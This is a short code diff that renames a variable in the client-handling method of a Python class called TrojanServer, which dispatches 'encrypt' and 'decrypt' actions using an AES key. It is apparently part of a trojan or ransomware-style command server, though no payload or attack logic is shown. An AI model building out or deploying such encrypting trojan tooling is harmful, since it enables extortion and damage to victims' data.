@@ -36,9 +36,9 @@ class  TrojanServer:
 
     def handle_client(self, conn, action):
         if action == "encrypt":
-            key = self._handle_encrypt(conn)
+            aes_key = self._handle_encrypt(conn)
         else:
-            key = self._handle_decrypt(conn)
+            aes_key = self._handle_decrypt(conn)
         
         protocol.send(conn, action)
         response = protocol.receive(conn).decode()
